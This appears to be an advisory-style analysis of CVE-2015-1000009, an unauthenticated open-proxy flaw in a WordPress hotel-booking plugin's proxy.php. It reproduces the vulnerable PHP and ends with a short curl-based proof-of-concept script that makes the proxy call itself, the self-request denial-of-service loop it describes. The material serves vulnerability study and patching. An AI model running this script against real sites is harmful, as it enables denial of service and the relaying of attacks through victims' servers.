Based on the provided information, here's an analysis of CVE-2015-1000009:

**Root Cause of Vulnerability:**

The vulnerability stems from the `proxy.php` file within the "google-adsense-and-hotel-booking" WordPress plugin. This file allows arbitrary users to send POST requests through the host server. The code takes a URL and POST data from the user, constructs an HTTP POST request, and forwards it to the specified URL using `fsockopen`.

**Weaknesses/Vulnerabilities Present:**

*   **Open Proxy:** The `proxy.php` script acts as an open proxy, allowing external users to relay requests through the vulnerable server.
*   **Lack of Input Validation/Sanitization:** The code does not validate or sanitize the URL or POST data provided by the user. This allows attackers to send requests to arbitrary URLs and include malicious data.
*   **Improper Access Control:**  There is no access control mechanism in place to prevent unauthorized users from utilizing the proxy functionality.

**Impact of Exploitation:**

*   **Attack Obfuscation:** Attackers can hide the source of their attacks by relaying them through the vulnerable server.
*   **Denial of Service (DoS):** An attacker can cause a DoS by making the vulnerable server send requests to itself, creating a loop that consumes server resources.
*   **Arbitrary Request Sending:** The attacker can send any POST request to any location on the internet using the proxy server, potentially exploiting other vulnerabilities or accessing protected resources.

**Attack Vectors:**

*   An attacker sends a crafted POST request to the `/wp-content/plugins/google-adsense-and-hotel-booking/proxy.php` file on a vulnerable WordPress installation. This request includes a target URL and potentially other data in the POST body. The `proxy.php` script then forwards the request to the attacker-specified URL.

**Required Attacker Capabilities/Position:**

*   The attacker needs to be able to send HTTP POST requests to the vulnerable WordPress site.
*   No authentication or special permissions are required to exploit this vulnerability.

**Technical Details:**

The vulnerable code snippet from `proxy.php`:

```php
3  $url = $_POST['url'];
4  ini_set("allow_url_fopen", 1);
5  $data = array();
6  while(list($n,$v) = each($_POST)){$data[] = "$n=$v";}
7  $data = implode('&', $data);
8  $url = parse_url($url);
9  $host = $url['host'];
10 $path = $url['path'];
11 $port = 80;
12 $data_length = strlen($data);
13 $header = "POST $path HTTP/1.0\r\n";
14 $header .= "Host: $host\r\n";
15 $header .= "User-Agent: DoCoMo/1.0/P503i\r\n";
16 $header .= "Content-type: application/x-www-form-urlencoded\r\n";
17 $header .= "Content-length: $data_length\r\n";
18 $header .= "\r\n";
19 $fp = fsockopen($host,$port,$err_num,$err_msg,120);
20 $response ='';
21 fputs($fp, $header . $data);
22 while(trim(fgets($fp,4096)) != '');//Retira o cabecalho HTTP
23 while(!feof($fp)){$response .= fgets($fp,4096);}
24 // close the socket connection:
25 fclose($fp);
26 echo $response;
```

**Exploit Code Example:**
```php
<?php
$target_url = 'http://www.example.com/wp-content/plugins/google-adsense-and-hotel-booking/proxy.php';
echo "POST to $target_url";
$post = array('url' => $target_url,'url'=>$target_url);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target_url);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$result=curl_exec ($ch);
curl_close ($ch);
echo "#####################################";
echo $result;
echo "#####################################";
?>
